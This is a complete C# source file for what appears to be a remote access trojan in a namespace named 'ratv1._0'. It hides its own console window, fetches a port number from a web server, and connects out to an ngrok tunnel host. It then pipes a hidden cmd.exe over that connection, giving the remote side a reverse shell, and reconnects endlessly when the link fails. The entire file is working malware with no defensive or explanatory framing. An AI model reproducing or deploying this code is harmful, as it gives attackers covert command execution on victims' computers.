using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Net;

namespace ratv1._0
{
    class Program
    {
        static StreamWriter streamWriter;
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            const int SW_HIDE = 0;
            ShowWindow(handle, SW_HIDE);
        typ:
            try
            {

                WebClient wc = new WebClient();
                String webData = wc.DownloadString("http://192.168.1.19/port.txt");
                int port =int.Parse(webData);
                using (TcpClient client = new TcpClient("0.tcp.ngrok.io", port))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }
            catch (Exception)
            {
                goto typ;
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { Console.WriteLine(err); }
            }
        }

        [DllImport("kernel32.dll")]

        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]

        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
